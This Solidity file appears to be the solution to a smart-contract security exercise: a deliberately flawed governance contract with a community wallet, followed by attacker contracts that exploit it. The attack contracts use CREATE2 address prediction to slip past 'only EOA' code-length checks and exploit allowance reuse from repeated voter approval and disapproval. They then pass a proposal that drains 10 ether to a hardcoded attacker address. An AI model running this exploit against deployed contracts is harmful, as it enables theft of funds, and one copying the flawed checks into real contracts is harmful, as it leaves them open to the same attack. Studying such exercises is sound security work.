// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract OligarchyNFT is ERC721 {
    constructor(address attacker) ERC721("Oligarch", "OG") {
        _mint(attacker, 1);
    }

    function _beforeTokenTransfer(address from, address, uint256, uint256) internal virtual override {
        require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
    }
}

contract Governance {
    IERC721 private immutable oligargyNFT;
    CommunityWallet public immutable communityWallet;
    mapping(uint256 => bool) public idUsed;
    mapping(address => bool) public alreadyVoted;

    //@audit mappings inside a struct do not get deleted
    struct Appointment {
        //approvedVoters: mapping(address => bool),
        uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
        uint256 numAppointments;
        mapping(address => bool) approvedVoter;
    }

    struct Proposal {
        uint256 votes;
        bytes data;
    }

    mapping(address => Appointment) public viceroys;
    mapping(uint256 => Proposal) public proposals;

    constructor(ERC721 _oligarchyNFT) payable {
        oligargyNFT = _oligarchyNFT;
        communityWallet = new CommunityWallet{value: msg.value}(address(this));
    }

    /*
     * @dev an oligarch can appoint a viceroy if they have an NFT
     * @param viceroy: the address who will be able to appoint voters
     * @param id: the NFT of the oligarch
     */
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        idUsed[id] = true;
        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");

        idUsed[id] = false;
        delete viceroys[viceroy];
    }

    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }

    function disapproveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
        viceroys[msg.sender].numAppointments += 1;
        delete viceroys[msg.sender].approvedVoter[voter];
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        require(
            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
            "sender not a viceroy or voter"
        );

        uint256 proposalId = uint256(keccak256(proposal));
        proposals[proposalId].data = proposal;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        require(proposals[proposal].data.length != 0, "proposal not found");
        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter");
        require(!alreadyVoted[msg.sender], "Already voted");
        if (inFavor) {
            proposals[proposal].votes += 1;
        }
        alreadyVoted[msg.sender] = true;
    }

    function executeProposal(uint256 proposal) external {
        require(proposals[proposal].votes >= 10, "Not enough votes");
        (bool res, ) = address(communityWallet).call(proposals[proposal].data);
        require(res, "call failed");
    }
}

contract CommunityWallet {
    address public governance;

    constructor(address _governance) payable {
        governance = _governance;
    }

    function exec(address target, bytes calldata data, uint256 value) external {
        require(msg.sender == governance, "Caller is not governance contract");
        (bool res, ) = target.call{value: value}(data);
        require(res, "call failed");
    }

    fallback() external payable {}
}

contract GovernanceAttacker {
    address public constant ATTACKER_ADDRESS = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    constructor() payable {}

    function predictAddress(
        address _deployer,
        bytes32 _salt,
        bytes memory _creationCode,
        bytes memory _encodedArgs
    ) public pure returns (address predictedAddress) {
        predictedAddress = address(
            uint160(
                uint(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            _deployer,
                            _salt,
                            keccak256(abi.encodePacked(_creationCode, _encodedArgs))
                        )
                    )
                )
            )
        );
    }
    function attack(Governance _governance) public {
        address viceroyAddress = predictAddress(
            address(this),
            bytes32(hex"1729"),
            type(EOAViceroy).creationCode,
            abi.encode(address(_governance))
        );
        // Appoint the viceroy before deloying the contract (hence 0 code because no contract in this address yet)
        _governance.appointViceroy(viceroyAddress, 1);

        // deploy contract at viceroyAddress address and then appoint voters inside its constructor
        new EOAViceroy{salt: bytes32(hex"1729")}(_governance);
    }
}

contract EOAVoter {
    constructor(Governance _governance, uint256 _proposalId) {
        _governance.voteOnProposal(_proposalId, true, msg.sender);
    }
}

contract EOAViceroy {
    address public constant ATTACKER_ADDRESS = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    function predictAddress(
        address _deployer,
        bytes32 _salt,
        bytes memory _creationCode,
        bytes memory _encodedArgs
    ) public pure returns (address predictedAddress) {
        predictedAddress = address(
            uint160(
                uint(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            _deployer,
                            _salt,
                            keccak256(abi.encodePacked(_creationCode, _encodedArgs))
                        )
                    )
                )
            )
        );
    }

    constructor(Governance _governance) {
        // create a proposal to transfer ether by calling `exec` on CommunityWallet
        bytes memory proposalData = abi.encodeWithSignature(
            "exec(address,bytes,uint256)",
            ATTACKER_ADDRESS,
            "",
            10 ether
        );
        uint256 proposalId = uint256(keccak256(proposalData));
        _governance.createProposal(address(this), proposalData);

        for (uint i; i < 10; ++i) {
            address voterAddress = predictAddress(
                address(this),
                bytes32(uint256(i)),
                type(EOAVoter).creationCode,
                abi.encode(address(_governance), proposalId)
            );
            // since voter.code.length == 0, appoint the voter first and then deploy the contract to it
            _governance.approveVoter(voterAddress);

            // deploy voter and vote inside its constructor
            new EOAVoter{salt: bytes32(uint256(i))}(_governance, proposalId);

            // disapprove voter to reset the allowance
            _governance.disapproveVoter(voterAddress);
        }

        // execute proposal
        _governance.executeProposal(proposalId);
    }
}
